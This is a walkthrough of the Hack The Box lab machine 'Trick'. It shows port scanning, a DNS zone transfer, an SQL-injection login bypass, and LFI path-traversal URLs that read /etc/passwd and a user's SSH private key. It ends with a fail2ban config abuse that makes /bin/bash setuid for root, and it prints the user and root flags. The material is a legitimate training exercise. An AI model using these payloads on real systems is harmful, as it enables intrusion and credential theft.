![Trick.PNG](/assets/Trick/Trick.png)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.166
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.166
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```


3. Do virtual hosting in `/etc/hosts`

![host.PNG](/assets/Trick/host.PNG)

---
![page.PNG](/assets/Trick/page.PNG)

4. With `dig` search vhosts
```bash
┌──(root㉿est)-[~kali/Desktop/Machines/Easy/Trick]
└─| dig @10.10.11.166 trick.htb axfr\
```

**Output**
```bash
; <<>> DiG 9.18.7-1-Debian <<>> @10.10.11.166 trick.htb axfr
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 163 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Tue Nov 01 13:32:01 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

5. Put `preprod-payroll.trick.htb` into `/etc/hosts`
   
![host-2.PNG](/assets/Trick/host-2.PNG)

---
In the new page, do a basic SQLi to login how **administrator**

![page-2.PNG](/assets/Trick/page-2.PNG)

You login how **Administrator**!

![admin.PNG](/assets/Trick/admin.PNG)

---
Go to **Users** and get a password

![get-password.PNG](/assets/Trick/get-password.PNG)



6. Use php://filter/convert.base64-encode/resource=home to try get information

```url
http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home
```

**Output**

![home-64.PNG](/assets/Trick/home-64.PNG)
* Decode this string

---
```bash
┌──(root㉿est)-[~kali/Desktop/Machines/Easy/Trick]
└─| echo "PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg==" | base64 -d
```

**Output**
```php
<?php include 'db_connect.php' ?>
<style>
   
</style>

<div class="containe-fluid">

        <div class="row">
                <div class="col-lg-12">

                </div>
        </div>

        <div class="row mt-3 ml-3 mr-3">
                        <div class="col-lg-12">
                <div class="card">
                    <div class="card-body">
                    <?php echo "Welcome back ". $_SESSION['login_name']."!"  ?>
                                        
                    </div>
                    
                </div>
            </div>
        </div>

</div>
<script></script>
```

---
Access `db_connect.php` file in base 64
```url
http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect
```
* Decode this string

```bash
┌──(root㉿est)-[~kali/Desktop/Machines/Easy/Trick]
└─| echo "PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyZW1vJywnVHJ1bHlJbXBvc3NpYmxlUGFzc3dvcmRMbWFvMTIzJywncGF5cm9sbF9kYicpb3IgZGllKCJDb3VsZCBub3QgY29ubmVjdCB0byBteXNxbCIubXlzcWxpX2Vycm9yKCRjb24pKTsNCg0K" | base64 -d
```

**Output**
```php
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```


7. Use wfuzz to search other **module** in **preprod**

```bash
┌──(root㉿est)-[~kali/Desktop/Machines/Easy/Trick]
└─| wfuzz -c -t 30 --hh=5480 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: preprod-FUZZ.trick.htb" http://trick.htb
```

**Output**
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                 
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "marketing"
```


8. Put new vhost on `/etc/hosts`

![host-3.PNG](/assets/Trick/host-3.PNG)

---
Visit the new page

![page-3.PNG](/assets/Trick/page-3.PNG)


9. If you visit a new page, the web site load a file, you can try **LFI**
```url
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//etc/passwd
```

![passwd.PNG](/assets/Trick/passwd.PNG)


10. Get a `id_rsa` key of user **michael**
```url
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
```

**Output**

![id_rsa.PNG](/assets/Trick/id_rsa.PNG)


11. Login with ssh with the key
```bash
┌──(root㉿est)-[~kali/Desktop/Machines/Easy/Trick]
└─| ssh michael@10.10.11.166 -i key
```

**Output**
```bash
-bash-5.0$ whoami
michael
```


12. Get **user flag**
```bash
-bash-5.0$ cat user.txt
52f0409eb13b94ab68c8409486881a98
```

13. Search permision of user
```bash
-bash-5.0$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```


14. You can modify a **iptables-multiport.conf** file to get access how root (path = /etc/fail2ban/action.d)

15. We dont write a file **iptables-multiport.conf**, then, create a new file with the same name and modify action ban to assign `chmod u+s /bin/bash`

```bash
-bash-5.0$ mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.bak
-bash-5.0$ cp /etc/fail2ban/action.d/iptables-multiport.bak /etc/fail2ban/action.d/iptables-multiport.conf
```

![fail2ban.PNG](/assets/Trick/fail2ban.PNG)

16. Restart service fail2ban 
```bash
-bash-5.0$ sudo /etc/init.d/fail2ban restart
```

17. Now, watch permisions of `/bin/bash` and put wrong credentials to login with ssh for be banned and get a `/bin/bash` how root

```bash
-bash-5.0$ watch -n 1 ls -l /bin/bash
```
---

```bash
┌──(root㉿est)-[/home/kali]
└─| ssh michael@trick.htb       
michael@trick.htb's password: 
Permission denied, please try again.
michael@trick.htb's password: 
Permission denied, please try again.
michael@trick.htb's password: 
michael@trick.htb: Permission denied (publickey,password).
                                                                             
┌──(root㉿est)-[/home/kali]
└─# ssh michael@trick.htb 
michael@trick.htb's password: 
3
Permission denied, please try again.
michael@trick.htb's password: 
Permission denied, please try again.
michael@trick.htb's password: 
michael@trick.htb: Permission denied (publickey,password).

```

18. Now, the permisions of `/bin/bash` change
```bash
sh: 0: getcwd() failed: No such file or directory
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```


19. Spawn a bash how root
```bash
-bash-5.0$ bash -p
bash-5.0# whoami
root
```

20. Cat **root flag**
```bash
bash-5.0# cat root.txt 
8a4a7ec07f01b772de3c85c350264507
```

You pwned the machine!